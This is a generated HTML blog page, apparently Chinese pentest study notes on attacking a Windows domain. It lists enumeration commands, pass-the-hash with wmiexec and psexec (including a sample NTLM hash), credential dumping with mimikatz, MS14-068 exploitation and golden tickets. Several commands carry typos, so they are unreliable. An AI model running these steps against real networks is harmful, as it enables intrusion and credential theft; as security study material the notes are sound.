@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword" content="">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="pengpengp&#39;s BLOG" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        域渗透｜undefined
+        
+    </title>
+
+    <link rel="canonical" href="https://pengpengp.github.io/2019/03/24/域渗透/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
+" data-ishome="false">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    pengpengp&#39;s BLOG
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img" src="">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>域渗透</h1>
+                    
+                    <span class="meta">
+                         作者 pengpengp
+                        <span>
+                          日期 2019-03-24
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#windows 域 域渗透" title="windows 域 域渗透">windows 域 域渗透</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            域渗透
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h2 id="一。搭建域环境："><a href="#一。搭建域环境：" class="headerlink" title="一。搭建域环境："></a>一。搭建域环境：</h2><p>作用：批量控制</p>
+<h4 id="1-域控制器的配置："><a href="#1-域控制器的配置：" class="headerlink" title="1.域控制器的配置："></a>1.域控制器的配置：</h4><p>服务器管理器-&gt;添加角色-&gt;勾选域服务-&gt;下一步-&gt;安装<br>运行-&gt;dcpromo启动域安装程序-&gt;创建一个”林”-&gt;命名-&gt;林功能级别”默认”-&gt;一直下一步-&gt;设置域控密码-&gt;一直下一步-&gt;重启。</p>
+<h4 id="2-把主机加入域控："><a href="#2-把主机加入域控：" class="headerlink" title="2.把主机加入域控："></a>2.把主机加入域控：</h4><p>​    计算机属性-&gt;更改域设置-&gt;隶属于-&gt;在域控中选择users-&gt;点右键，新建用户-&gt;注意用户名和密码<br>​    注意：需要防火墙通过域网络</p>
+<h2 id="二。了解域"><a href="#二。了解域" class="headerlink" title="二。了解域"></a>二。了解域</h2><h4 id="1-关键词："><a href="#1-关键词：" class="headerlink" title="1.关键词："></a>1.关键词：</h4><ul>
+<li><p>域控</p>
+</li>
+<li><p>域主机</p>
+</li>
+<li><p>域管理员：administrator  可以登陆域中任意一台主机</p>
+</li>
+<li><p>域账户：域控创建的“网络账户”   远程桌面禁止登陆        <em>默认情况下也可以登陆所有的主机</em>       域用户查看等命令只有用域账户登陆才能执行</p>
+</li>
+<li><p>本地账户：原有账户</p>
+</li>
+</ul>
+<h4 id="2-域的操作命令"><a href="#2-域的操作命令" class="headerlink" title="2.域的操作命令"></a>2.域的操作命令</h4><ul>
+<li>ipconfig/all可以查看是否在域中、</li>
+<li>ping 域名可以获取域控的ip地址</li>
+<li>et user “domain controllers” /domain 查询域控ip</li>
+<li>net user /domain 查看域中的用户</li>
+<li>dsquery  user                   #查看域控域所有域用户详细信息</li>
+<li>dsquery    server               #查看所有域控制器</li>
+<li>net  localgroup  administrators  zhuyu\test  /add     #把zhuyu域控域用户test添加到本地管理员组</li>
+<li>net view #查看域中的主机</li>
+<li>nte view/domain #查看所有域</li>
+</ul>
+<h2 id="三。域渗透大体方式"><a href="#三。域渗透大体方式" class="headerlink" title="三。域渗透大体方式"></a>三。域渗透大体方式</h2><h4 id="1-域中的远程磁盘映射"><a href="#1-域中的远程磁盘映射" class="headerlink" title="1.域中的远程磁盘映射"></a>1.域中的远程磁盘映射</h4><p><code>net use H: \\ip\c$ &quot;password&quot; /user:username</code></p>
+<p>net use H: /D    #删除H磁盘的映射</p>
+<h4 id="2-添加计划任务：net-time-ip-获取系统时间"><a href="#2-添加计划任务：net-time-ip-获取系统时间" class="headerlink" title="2.添加计划任务：net time \ip #获取系统时间"></a>2.添加计划任务：net time \ip #获取系统时间</h4><p>at \ip  10:57:00 /c “commond” #在10点57添加一项计划任务</p>
+<p>at \ip 1 /delete  #删除任务1<br>注意：net use 命令需要administrator用户连接，其他用户不行</p>
+<h4 id="3-工具："><a href="#3-工具：" class="headerlink" title="3.工具："></a>3.工具：</h4><ul>
+<li>psexec #远控工具，通过用户名和密码，直接执行命令</li>
+</ul>
+<p>–accepteula #打开时不弹窗</p>
+<ul>
+<li>wmiexec.exe #远控工具，域中使用</li>
+</ul>
+<p><code>wmiexec -hashes 00000000000000000000000000000000:03bebb338e70244589ea67c7439c77ba TEST/administrator@192.168.0.100 “whoami</code></p>
+<h2 id="四。-攻击具体流程和思路"><a href="#四。-攻击具体流程和思路" class="headerlink" title="四。.攻击具体流程和思路"></a>四。.攻击具体流程和思路</h2><ul>
+<li>获取域账户密码(    获取hash的工具 <code>mimikatz getpasswd pwdump7</code></li>
+</ul>
+<p>  (1)管理员的-&gt;用户名和密码、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用工具获取hash：`wimexec.exe -hashs ntlm_hash domain/uname@ip cmd`</span><br><span class="line">如果获取了明文密码：`net use \\ip\ipc$ &quot;pass&quot; /user:uname` 挂载分区，执行命令</span><br><span class="line">`psexec -h ip -u name -p pass cmd `</span><br></pre></td></tr></table></figure>
+<p>​    (2)普通用户的-&gt;网站是否存在域控ms14-068漏洞、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用`wimexec.exe -hashs ntlm_hash domain/uname@ip cmd`,普通用户一般没有权限</span><br><span class="line">用`ms14-068漏洞 -u 域成员们@域名 -s 域成员sid -d 域控ip  -p域成员密码`</span><br></pre></td></tr></table></figure>
+<p>​            (3)是否存在krbtgt用户-&gt;获取hash就相当于域控***</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果获取了此用户hash==黄金票据  直接用mimikatz攻击</span><br></pre></td></tr></table></figure>
+<p>​            (4)本地账户的-&gt;账户和明文密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描内网ip,有没有使用相同的口令</span><br></pre></td></tr></table></figure>
+<p>​<br>​    </p>
+<ul>
+<li>域中其他的主机使用web或ms漏洞攻击</li>
+</ul>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/03/16/常用渗透工具/" data-toggle="tooltip" data-placement="top" title="常用渗透工具">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一。搭建域环境："><span class="toc-text">一。搭建域环境：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-域控制器的配置："><span class="toc-text">1.域控制器的配置：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-把主机加入域控："><span class="toc-text">2.把主机加入域控：</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#二。了解域"><span class="toc-text">二。了解域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-关键词："><span class="toc-text">1.关键词：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-域的操作命令"><span class="toc-text">2.域的操作命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三。域渗透大体方式"><span class="toc-text">三。域渗透大体方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-域中的远程磁盘映射"><span class="toc-text">1.域中的远程磁盘映射</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-添加计划任务：net-time-ip-获取系统时间"><span class="toc-text">2.添加计划任务：net time \ip #获取系统时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-工具："><span class="toc-text">3.工具：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四。-攻击具体流程和思路"><span class="toc-text">四。.攻击具体流程和思路</span></a></li>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://pengpengp.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="">
+</body>
+
+</html>
